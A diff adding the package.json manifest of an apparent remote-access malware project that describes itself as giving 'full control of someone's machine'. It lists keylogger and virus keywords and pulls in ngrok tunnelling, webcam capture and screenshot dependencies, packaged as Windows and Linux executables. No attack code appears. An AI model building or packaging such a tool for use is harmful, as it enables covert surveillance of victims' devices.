@@ -1,0 +1,36 @@
+{
+  "name": "ultraviolet",
+  "version": "0.1.0",
+  "description": "An executable that gives you full control of someone's machine",
+  "main": "index.js",
+  "bin": "index.js",
+  "scripts": {
+    "start": "node index.js",
+    "build": "pkg -t node18-linux,node18-win ."
+  },
+  "keywords": [
+    "keylogger",
+    "virus",
+    "control"
+  ],
+  "author": "Milk_Cool",
+  "license": "MIT",
+  "homepage": "https://github.com/Milk-Cool/Ultraviolet#readme",
+  "dependencies": {
+    "express": "^4.18.2",
+    "ngrok": "^4.3.3",
+    "node-webcam": "^0.8.1",
+    "screenshot-desktop": "^0.0.0-development",
+    "systeminformation": "^5.17.12"
+  },
+  "pkg": {
+    "assets": [
+      "node_modules/"
+    ],
+    "targets": [
+      "node18-win",
+      "node18-linux"
+    ],
+    "outputPath": "dist"
+  }
+}
